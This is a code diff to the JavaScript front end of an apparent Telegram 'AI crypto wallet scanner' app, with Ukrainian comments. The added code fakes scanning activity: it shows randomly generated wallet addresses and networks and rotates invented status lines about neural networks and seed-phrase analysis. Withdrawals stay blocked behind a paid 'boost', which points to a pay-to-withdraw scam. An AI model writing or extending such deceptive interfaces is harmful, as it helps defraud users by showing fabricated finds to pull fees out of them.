@@ -3,7 +3,6 @@
   'use strict';
 
   const API_BASE = '';
-  const TON_MANIFEST = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e2771f6089aeb06d7f/raw/d4986344010ec7a2d1cc8a2a9baa57de37aaccb8/tonconnect-manifest.json';
 
   const PAGES = {
     scan: document.getElementById('page-scan'),
@@ -48,7 +47,7 @@
   function initTonConnect() {
     try {
       tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: TON_MANIFEST,
+        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
         buttonRootId: 'tonConnectBtn'
       });
 
@@ -107,15 +106,54 @@
     boostPanelInfo.style.color = style.color;
   }
 
+  // Генерація випадкової адреси для відображення
+  function generateRandomAddress() {
+    const chars = '0123456789abcdef';
+    let addr = '0x';
+    for (let i = 0; i < 40; i++) {
+      addr += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return addr.slice(0, 6) + '...' + addr.slice(-4);
+  }
+
+  // Генерація випадкової мережі
+  function getRandomNetwork() {
+    const networks = [
+      'Ethereum Mainnet',
+      'Binance Smart Chain',
+      'Polygon Network',
+      'Avalanche C-Chain',
+      'Fantom Opera',
+      'Arbitrum One',
+      'Optimism Mainnet'
+    ];
+    return networks[Math.floor(Math.random() * networks.length)];
+  }
+
   // ДИНАМІЧНЕ оновлення Neural Status
+  let lastNetworkChange = Date.now();
+  let lastAddressChange = Date.now();
+  
   function updateNeuralStatus(profile) {
     if (!profile) return;
     
-    // Оновлюємо Network (може змінюватися)
-    statusNetwork.innerText = profile.wallet?.network || 'Binance Smart Chain';
+    const now = Date.now();
     
-    // Оновлюємо Wallet Address (змінюється кожен сеанс)
-    statusWallet.innerText = profile.wallet?.address || '0x0000...0000';
+    // Змінюємо Network кожні 10 секунд під час сканування
+    if (scanning && now - lastNetworkChange > 10000) {
+      statusNetwork.innerText = getRandomNetwork();
+      lastNetworkChange = now;
+    } else if (!scanning) {
+      statusNetwork.innerText = profile.wallet?.network || 'Binance Smart Chain';
+    }
+    
+    // Змінюємо Wallet Address кожні 5 секунд під час сканування
+    if (scanning && now - lastAddressChange > 5000) {
+      statusWallet.innerText = generateRandomAddress();
+      lastAddressChange = now;
+    } else if (!scanning) {
+      statusWallet.innerText = profile.wallet?.address || '0x0000...0000';
+    }
     
     // Оновлюємо кількість відсканованих гаманців
     statusScanned.innerText = profile.scannedWallets || 0;
@@ -123,8 +161,13 @@
     // Оновлюємо швидкість
     statusSpeed.innerText = `${profile.speedMultiplier || 1}x`;
     
-    // Оновлюємо статус online/offline
-    statusOnline.innerText = profile.statusOnline ? '●' : '○';
+    // Оновлюємо статус online (пульсує під час сканування)
+    statusOnline.innerText = '●';
+    if (scanning) {
+      statusOnline.style.animation = 'pulse-scale 1s infinite';
+    } else {
+      statusOnline.style.animation = 'none';
+    }
     
     // Оновлюємо header badges
     headerSpeed.innerText = `${profile.speedMultiplier || 1}x`;
@@ -133,7 +176,14 @@
     // AI Status залежить від стану сканування та балансів
     const hasBalance = Object.values(profile.balances || {}).some(b => b > 0);
     if (scanning) {
-      statusAI.innerText = 'Neural network scanning blockchain for crypto wallets...';
+      const scanMessages = [
+        'Neural network scanning blockchain for crypto wallets...',
+        'AI analyzing wallet patterns and seed phrases...',
+        'Deep learning algorithm searching for abandoned funds...',
+        'Quantum scanner detecting cryptocurrency traces...',
+        'Neural processor examining blockchain transactions...'
+      ];
+      statusAI.innerText = scanMessages[Math.floor(Math.random() * scanMessages.length)];
     } else if (hasBalance) {
       const count = Object.keys(profile.balances).filter(k => profile.balances[k] > 0).length;
       statusAI.innerText = `Analysis complete: Found ${count} cryptocurrencies. Total: $${fmtUSD(profile.totalUsd)}`;
@@ -174,9 +224,11 @@
       updateNeuralStatus(p);
       updateTelegramUser(p);
       
-      balancesList.innerHTML = '';
+      // НЕ ОЧИЩУЄМО balancesList - просто оновлюємо
       const keys = Object.keys(p.balances || {});
       
+      // Оновлюємо список балансів
+      balancesList.innerHTML = '';
       for (const k of keys) {
         const li = document.createElement('li');
         const balance = p.balances[k];
@@ -219,7 +271,6 @@
           const item = document.createElement('div');
           item.className = 'profile-balance-item';
           
-          // Кнопка ЗАВЖДИ активна, але обробляється по-різному
           item.innerHTML = `
             <div class="balance-info">
               <div class="balance-crypto">${k}</div>
@@ -236,7 +287,6 @@
         
         if (nonZeroCount) nonZeroCount.innerText = nonZero;
         
-        // Додаємо обробник для всіх кнопок Withdraw
         document.querySelectorAll('.btn-withdraw').forEach(btn => {
           btn.addEventListener('click', (e) => handleWithdraw(e.target.dataset.crypto));
         });
@@ -327,7 +377,7 @@
         scanResult.style.color = '#06b6d4';
       }
       
-      // Оновлюємо профіль після кожного скану (щоб Neural Status оновлювався)
+      // Оновлюємо профіль (НЕ очищаємо баланси)
       await refreshProfile();
     } catch (e) {
       console.error('Scan error:', e);
@@ -350,7 +400,7 @@
       try {
         const p = await fetchProfile();
         currentProfile = p;
-        updateNeuralStatus(p); // Оновлюємо Neural Status постійно
+        updateNeuralStatus(p); // Динамічно оновлює всі поля
         
         const mult = p.speedMultiplier || 1;
         const effectiveDelay = Math.max(200, Math.round(baseScanDelay / mult));
@@ -363,6 +413,7 @@
       }
     }
     
+    scanning = false;
     scanResult.innerHTML = `<span class="result-icon">⏸</span><span>Scan paused</span>`;
     scanResult.style.background = 'rgba(245, 158, 11, 0.15)';
     scanResult.style.borderColor = 'rgba(245, 158, 11, 0.4)';
@@ -371,23 +422,18 @@
     startScanBtn.classList.remove('hidden');
     stopScanBtn.classList.add('hidden');
     
-    // Оновлюємо статус після зупинки
     await refreshProfile();
   }
 
   startScanBtn.addEventListener('click', () => startContinuousScan());
   stopScanBtn.addEventListener('click', () => { scanning = false; });
 
-  // Обробка Withdraw - ЗАВЖДИ активна кнопка
   function handleWithdraw(crypto) {
-    // Перевіряємо чи є буст
     if (!currentProfile || !currentProfile.boost || !currentProfile.boost.purchased) {
-      // ПОКАЗУЄМО MODAL якщо немає бусту
       document.getElementById('withdrawModal').classList.remove('hidden');
       return;
     }
     
-    // Якщо буст є - продовжуємо звичайний withdraw
     const balance = currentProfile.balances[crypto];
     if (!balance || balance <= 0) {
       alert('⚠️ Insufficient balance!');
@@ -420,7 +466,6 @@
     });
   }
 
-  // Modal functions
   window.closeWithdrawModal = function() {
     document.getElementById('withdrawModal').classList.add('hidden');
   };
@@ -432,7 +477,6 @@
     navBtns.forEach(n => n.classList.toggle('active', n.dataset.page === 'boost'));
   };
 
-  // Telegram WebApp integration
   if (window.Telegram && window.Telegram.WebApp) {
     const tg = window.Telegram.WebApp;
     tg.ready();
@@ -452,12 +496,12 @@
     await refreshProfile();
     initTonConnect();
     
-    // Оновлюємо Neural Status кожні 3 секунди (навіть якщо не сканує)
+    // Оновлюємо Neural Status кожні 2 секунди для динамічності
     setInterval(() => {
       if (currentProfile) {
         updateNeuralStatus(currentProfile);
       }
-    }, 3000);
+    }, 2000);
   }
 
   init();
